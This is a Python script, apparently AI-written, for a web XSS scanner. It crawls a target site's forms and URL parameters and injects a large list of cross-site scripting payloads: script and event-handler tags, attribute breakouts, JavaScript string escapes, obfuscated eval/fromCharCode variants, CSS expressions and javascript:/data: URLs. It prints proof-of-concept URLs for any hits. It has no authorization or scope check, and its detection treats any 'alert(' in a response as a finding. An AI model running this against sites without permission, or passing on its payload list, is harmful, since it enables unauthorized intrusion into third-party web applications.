#!/usr/bin/env python3
"""
XSS Scanner - Advanced XSS vulnerability scanner
Author: AI Assistant
Version: 1.0
"""

import requests
import re
import urllib.parse
import time
import random
import string
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from colorama import init, Fore, Style
import sys

# Initialize colorama for colored output
init()

class XSSScanner:
    def __init__(self, target_url, max_threads=10, delay=1):
        self.target_url = target_url
        self.max_threads = max_threads
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.lock = threading.Lock()
        
    def log(self, message, level="INFO"):
        """Print a colored log message based on level"""
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.MAGENTA
        }
        print(f"{colors.get(level, Fore.WHITE)}[{level}] {message}{Style.RESET_ALL}")
    
    def extract_forms(self, html_content, base_url):
        """Extract forms from HTML"""
        forms = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }
            
            # Extract input fields
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                }
                form_data['inputs'].append(input_data)
            
            # Convert action to absolute URL
            if form_data['action']:
                form_data['action'] = urljoin(base_url, form_data['action'])
            else:
                form_data['action'] = base_url
                
            forms.append(form_data)
        
        return forms
    
    def extract_links(self, html_content, base_url):
        """Extract links from HTML"""
        links = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            links.append(full_url)
        
        return links
    
    def extract_parameters(self, url):
        """Extract query parameters from URL"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return params
    
    def reconnaissance(self):
        """Reconnaissance phase - information gathering"""
        self.log("Starting Reconnaissance phase...", "INFO")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            response.raise_for_status()
            
            self.log(f"Successful request to {self.target_url}", "SUCCESS")
            
            # Extract forms
            forms = self.extract_forms(response.text, self.target_url)
            self.log(f"Number of forms found: {len(forms)}", "INFO")
            
            # Extract links
            links = self.extract_links(response.text, self.target_url)
            self.log(f"Number of links found: {len(links)}", "INFO")
            
            # Extract parameters from base URL
            params = self.extract_parameters(self.target_url)
            self.log(f"Number of URL parameters: {len(params)}", "INFO")
            
            return {
                'forms': forms,
                'links': links,
                'params': params,
                'html': response.text
            }
            
        except Exception as e:
            self.log(f"Error during reconnaissance: {str(e)}", "ERROR")
            return None
    
    def identify_contexts(self, param_value, html_content):
        """Identify potential reflection contexts for a parameter value"""
        contexts = []
        
        # HTML Context
        if re.search(r'<[^>]*' + re.escape(param_value) + r'[^>]*>', html_content, re.IGNORECASE):
            contexts.append('html')
        
        # Attribute Context
        if re.search(r'=\s*["\']' + re.escape(param_value) + r'["\']', html_content, re.IGNORECASE):
            contexts.append('attribute')
        
        # JavaScript Context
        if re.search(r'<script[^>]*>.*' + re.escape(param_value) + r'.*</script>', html_content, re.IGNORECASE | re.DOTALL):
            contexts.append('javascript')
        
        # CSS Context
        if re.search(r'<style[^>]*>.*' + re.escape(param_value) + r'.*</style>', html_content, re.IGNORECASE | re.DOTALL):
            contexts.append('css')
        
        # URL Context
        if re.search(r'https?://[^\s]*' + re.escape(param_value) + r'[^\s]*', html_content, re.IGNORECASE):
            contexts.append('url')
        
        return contexts if contexts else ['html']  # Default to HTML context
    
    def generate_payloads(self, context):
        """Generate XSS payloads per detected context"""
        payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus><option>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '<isindex onfocus=alert("XSS") autofocus>',
                '<form><button formaction="javascript:alert(\'XSS\')">',
                '<object data="javascript:alert(\'XSS\')">',
                '<embed src="javascript:alert(\'XSS\')">',
                '<applet code="javascript:alert(\'XSS\')">',
                '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')" x="',
                "' onmouseover='alert(\"XSS\")' x='",
                '" onfocus="alert(\'XSS\')" autofocus="',
                "' onfocus='alert(\"XSS\")' autofocus='",
                '" onload="alert(\'XSS\')" x="',
                "' onload='alert(\"XSS\")' x='",
                '" onerror="alert(\'XSS\')" x="',
                "' onerror='alert(\"XSS\")' x='",
                '" onclick="alert(\'XSS\')" x="',
                "' onclick='alert(\"XSS\")' x='",
                '" onblur="alert(\'XSS\')" autofocus="',
                "' onblur='alert(\"XSS\")' autofocus='",
                '" onchange="alert(\'XSS\')" x="',
                "' onchange='alert(\"XSS\")' x='",
                '" onsubmit="alert(\'XSS\')" x="',
                "' onsubmit='alert(\"XSS\")' x='",
                '" onreset="alert(\'XSS\')" x="',
                "' onreset='alert(\"XSS\")' x='",
                '" onselect="alert(\'XSS\')" x="',
                "' onselect='alert(\"XSS\")' x='"
            ],
            'javascript': [
                '";alert("XSS");//',
                "';alert('XSS');//",
                '";alert(String.fromCharCode(88,83,83));//',
                "';alert(String.fromCharCode(88,83,83));//",
                '";alert(/XSS/);//',
                "';alert(/XSS/);//",
                '";alert`XSS`;//',
                "';alert`XSS`;//",
                '";eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41));//',
                "';eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41));//",
                '";window["alert"]("XSS");//',
                "';window['alert']('XSS');//",
                '";setTimeout("alert(\\"XSS\\")",0);//',
                "';setTimeout('alert(\\'XSS\\')',0);//",
                '";setInterval("alert(\\"XSS\\")",1000);//',
                "';setInterval('alert(\\'XSS\\')',1000);//",
                '";Function("alert(\\"XSS\\")")();//',
                "';Function('alert(\\'XSS\\')')();//",
                '";[].constructor.constructor("alert(\\"XSS\\")")();//',
                "';[].constructor.constructor('alert(\\'XSS\\')')();//"
            ],
            'css': [
                'expression(alert("XSS"))',
                'expression(alert(String.fromCharCode(88,83,83)))',
                'expression(eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)))',
                'expression(window["alert"]("XSS"))',
                'expression(setTimeout("alert(\\"XSS\\")",0))',
                'expression(setInterval("alert(\\"XSS\\")",1000))',
                'expression(Function("alert(\\"XSS\\")")())',
                'expression([].constructor.constructor("alert(\\"XSS\\")")())',
                'url("javascript:alert(\\"XSS\\")")',
                'url("javascript:alert(String.fromCharCode(88,83,83))")',
                'url("javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))")',
                'url("javascript:window[\\"alert\\"](\\"XSS\\")")',
                'url("javascript:setTimeout(\\"alert(\\'XSS\\')\\",0)")',
                'url("javascript:setInterval(\\"alert(\\'XSS\\')\\",1000)")',
                'url("javascript:Function(\\"alert(\\'XSS\\')\\")()")',
                'url("javascript:[].constructor.constructor(\\"alert(\\'XSS\\')\\")()")'
            ],
            'url': [
                'javascript:alert("XSS")',
                'javascript:alert(String.fromCharCode(88,83,83))',
                'javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))',
                'javascript:window["alert"]("XSS")',
                'javascript:setTimeout("alert(\\"XSS\\")",0)',
                'javascript:setInterval("alert(\\"XSS\\")",1000)',
                'javascript:Function("alert(\\"XSS\\")")()',
                'javascript:[].constructor.constructor("alert(\\"XSS\\")")()',
                'data:text/html,<script>alert("XSS")</script>',
                'data:text/html,<img src=x onerror=alert("XSS")>',
                'data:text/html,<svg onload=alert("XSS")>',
                'data:text/html,<iframe src="javascript:alert(\\'XSS\\')">',
                'data:text/html,<body onload=alert("XSS")>',
                'data:text/html,<input onfocus=alert("XSS") autofocus>',
                'data:text/html,<select onfocus=alert("XSS") autofocus><option>',
                'data:text/html,<textarea onfocus=alert("XSS") autofocus>',
                'data:text/html,<keygen onfocus=alert("XSS") autofocus>',
                'data:text/html,<video><source onerror="alert(\\'XSS\\')">',
                'data:text/html,<audio src=x onerror=alert("XSS")>',
                'data:text/html,<details open ontoggle=alert("XSS")>'
            ]
        }
        
        return payloads.get(context, payloads['html'])
    
    def test_payload(self, url, param_name, payload, method='GET'):
        """Test a single XSS payload against a parameter"""
        try:
            if method.upper() == 'GET':
                # Test GET
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
            else:
                # Test POST
                data = {param_name: payload}
                response = self.session.post(url, data=data, timeout=10)
            
            # Check for alert presence in response
            if 'alert(' in response.text or 'alert("' in response.text or "alert('" in response.text:
                return True, response.text
                
        except Exception as e:
            self.log(f"Error testing payload: {str(e)}", "ERROR")
            
        return False, ""
    
    def scan_parameter(self, url, param_name, contexts, method='GET'):
        """Scan a single parameter for XSS"""
        self.log(f"Scanning parameter: {param_name}", "INFO")
        
        for context in contexts:
            self.log(f"Testing context: {context}", "INFO")
            payloads = self.generate_payloads(context)
            
            for payload in payloads:
                success, response = self.test_payload(url, param_name, payload, method)
                
                if success:
                    with self.lock:
                        vuln = {
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'context': context,
                            'method': method,
                            'response': response[:1000]  # limit response length
                        }
                        self.vulnerabilities.append(vuln)
                        self.log(f"XSS FOUND! Parameter: {param_name}, Context: {context}", "VULN")
                        self.log(f"Payload: {payload}", "VULN")
                        return True
                
                time.sleep(self.delay)  # delay between requests
        
        return False
    
    def scan_form(self, form):
        """Scan a single form for XSS"""
        self.log(f"Scanning form: {form['action']}", "INFO")
        
        for input_field in form['inputs']:
            if input_field['name']:
                # Test with multiple contexts
                contexts = ['html', 'attribute', 'javascript']
                
                for context in contexts:
                    payloads = self.generate_payloads(context)
                    
                    for payload in payloads:
                        # Prepare form data
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                form_data[field['name']] = payload
                            else:
                                form_data[field['name']] = field['value']
                        
                        try:
                            if form['method'] == 'POST':
                                response = self.session.post(form['action'], data=form_data, timeout=10)
                            else:
                                response = self.session.get(form['action'], params=form_data, timeout=10)
                            
                            if 'alert(' in response.text or 'alert("' in response.text or "alert('" in response.text:
                                with self.lock:
                                    vuln = {
                                        'url': form['action'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'context': context,
                                        'method': form['method'],
                                        'response': response.text[:1000]
                                    }
                                    self.vulnerabilities.append(vuln)
                                    self.log(f"XSS FOUND! Form: {form['action']}, Field: {input_field['name']}", "VULN")
                                    self.log(f"Payload: {payload}", "VULN")
                                    return True
                                    
                        except Exception as e:
                            self.log(f"Error testing form: {str(e)}", "ERROR")
                        
                        time.sleep(self.delay)
        
        return False
    
    def run_scan(self):
        """Run full XSS scan"""
        self.log("Starting XSS scan...", "INFO")
        
        # Reconnaissance phase
        recon_data = self.reconnaissance()
        if not recon_data:
            self.log("Error in reconnaissance phase", "ERROR")
            return
        
        # Scan URL parameters
        if recon_data['params']:
            self.log("Scanning URL parameters...", "INFO")
            for param_name in recon_data['params']:
                contexts = self.identify_contexts(recon_data['params'][param_name][0], recon_data['html'])
                self.scan_parameter(self.target_url, param_name, contexts, 'GET')
        
        # Scan forms
        if recon_data['forms']:
            self.log("Scanning forms...", "INFO")
            for form in recon_data['forms']:
                self.scan_form(form)
        
        # Scan additional links (discover new parameters)
        self.log("Scanning additional links...", "INFO")
        for link in recon_data['links'][:10]:  # limit to first 10 links
            try:
                link_params = self.extract_parameters(link)
                if link_params:
                    for param_name in link_params:
                        contexts = self.identify_contexts(link_params[param_name][0], recon_data['html'])
                        self.scan_parameter(link, param_name, contexts, 'GET')
            except:
                continue
        
        # Show results
        self.show_results()
    
    def show_results(self):
        """Display scan results"""
        self.log("=" * 50, "INFO")
        self.log("XSS Scan Results", "INFO")
        self.log("=" * 50, "INFO")
        
        if not self.vulnerabilities:
            self.log("No XSS vulnerabilities found", "WARNING")
            return
        
        self.log(f"Total findings: {len(self.vulnerabilities)}", "SUCCESS")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            self.log(f"\n--- Vulnerability {i} ---", "VULN")
            self.log(f"URL: {vuln['url']}", "VULN")
            self.log(f"Parameter: {vuln['parameter']}", "VULN")
            self.log(f"Context: {vuln['context']}", "VULN")
            self.log(f"Method: {vuln['method']}", "VULN")
            self.log(f"Payload: {vuln['payload']}", "VULN")
            self.log(f"POC: {vuln['url']}?{vuln['parameter']}={urllib.parse.quote(vuln['payload'])}", "VULN")
        
        # Save results
        self.save_results()
    
    def save_results(self):
        """Save results to JSON file"""
        try:
            with open('xss_results.json', 'w', encoding='utf-8') as f:
                json.dump(self.vulnerabilities, f, ensure_ascii=False, indent=2)
            self.log("Results saved to xss_results.json", "SUCCESS")
        except Exception as e:
            self.log(f"Error saving results: {str(e)}", "ERROR")

def main():
    parser = argparse.ArgumentParser(description='XSS Scanner - Advanced XSS vulnerability scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=1, help='Delay between requests in seconds (default: 1)')
    
    args = parser.parse_args()
    
    scanner = XSSScanner(args.url, args.threads, args.delay)
    scanner.run_scan()

if __name__ == "__main__":
    main()